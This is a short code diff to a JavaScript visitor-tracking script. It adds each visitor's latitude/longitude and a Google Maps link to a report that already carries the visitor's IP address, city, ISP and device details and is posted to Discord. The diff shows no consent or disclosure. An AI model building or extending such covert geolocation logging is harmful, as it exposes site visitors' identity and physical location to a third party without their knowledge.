@@ -534,7 +534,8 @@
                         city: geo.city,
                         country_name: geo.country,
                         org: geo.org,
-                        mobile: /Mobi|Android|iPhone|iPad/i.test(navigator.userAgent)
+                        mobile: /Mobi|Android|iPhone|iPad/i.test(navigator.userAgent),
+                        loc: geo.loc
                     });
                 } else {
                     sendToDiscord(visitorData, null);
@@ -549,13 +550,14 @@
         var location = geo ? (geo.city || '?') + ', ' + (geo.country_name || '?') : 'Unknown';
         var ip = geo ? geo.ip : 'Unknown';
         var isp = geo ? (geo.org || 'Unknown') : 'Unknown';
+        var mapLink = (geo && geo.loc) ? '[📍 Open on map](https://www.google.com/maps?q=' + geo.loc + ')' : '';
 
         var desc = [
             '**Page:** ' + data.page,
             '**Referrer:** ' + data.referrer,
             '',
             '**IP:** `' + ip + '`',
-            '**Location:** ' + location,
+            '**Location:** ' + location + (mapLink ? '  ' + mapLink : ''),
             '**ISP:** ' + isp,
             '',
             '**Screen:** ' + data.screen + ' | **Mobile:** ' + data.mobile,
